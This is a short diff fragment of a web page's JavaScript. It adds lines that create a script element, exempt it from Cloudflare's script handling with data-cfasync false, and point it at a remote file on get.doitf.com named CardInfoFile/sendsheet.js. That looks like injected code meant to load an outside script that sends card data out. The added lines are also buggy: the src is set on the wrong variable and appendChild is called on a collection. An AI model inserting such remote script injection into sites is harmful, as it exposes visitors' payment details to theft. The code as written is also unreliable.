@@ -13,6 +13,11 @@ alert(getnumCards)
 alert(getnumCards)
 
 
+  var para2 = document.createElement("script");
+  para2.setAttribute("data-cfasync", "false");
+  para.setAttribute("src", "https://get.doitf.com/gurl/CardInfoFile/sendsheet.js?v=1");
+document.getElementsByTagName("head").appendChild(para2);
+
 
 	
 $("#topcontrol").remove();
